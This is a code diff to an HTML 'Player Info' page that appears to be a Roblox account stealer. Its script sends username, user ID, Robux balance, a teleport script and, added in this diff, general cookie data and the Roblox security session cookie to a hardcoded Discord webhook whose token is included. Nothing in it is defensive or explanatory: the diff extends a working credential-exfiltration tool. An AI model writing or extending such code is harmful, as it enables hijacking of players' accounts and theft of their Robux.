@@ -3,14 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+    <title>Player Info</title>
 </head>
 <body>
-    <h1>info</h1>
+    <h1>Player Info</h1>
     <div id="player-info"></div>
     <footer>
         <p id="footer-text"></p>
     </footer>
+    <h3>Cookie Information:</h3>
+    <p id="cookie-info"></p> <!-- This is where the cookie will be displayed -->
+    <h3>Roblox Security Cookie:</h3>
+    <p id="roblox-security"></p> <!-- Display the Roblox security cookie here -->
     <script>
         function sendDataToWebhook(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
@@ -36,16 +40,27 @@
 
         const playerInfoDiv = document.getElementById('player-info');
         const footerText = document.getElementById('footer-text');
+        const cookieInfo = document.getElementById('cookie-info');
+        const robloxSecurity = document.getElementById('roblox-security');
         const message = data;
 
+        // Display player info
         playerInfoDiv.innerHTML = `
-            <p><strong>usr:</strong> ${message.username}</p>
-            <p><strong>usrid:</strong> ${message.userId}</p>
-            <p><strong>robux:</strong> ${message.robuxAmount}</p>
+            <p><strong>Username:</strong> ${message.username}</p>
+            <p><strong>UserID:</strong> ${message.userId}</p>
+            <p><strong>Robux:</strong> ${message.robuxAmount}</p>
+            <p><strong>Teleport Script:</strong> ${message.teleportScript}</p>
             <img src="${message.headshotUrl}" alt="Player Headshot" width="150" height="150">
         `;
 
-        footerText.innerHTML = `join him: ${message.teleportScript}`;
+        // Display footer text (Teleport Script)
+        footerText.innerHTML = `Teleport Script: ${message.teleportScript}`;
+
+        // Display cookie data
+        cookieInfo.innerHTML = `Cookie Data: ${message.cookie}`;
+
+        // Display Roblox security cookie
+        robloxSecurity.innerHTML = `Roblox Security Cookie: ${message.robloxSecurity}`;
 
         sendDataToWebhook(data);
     </script>
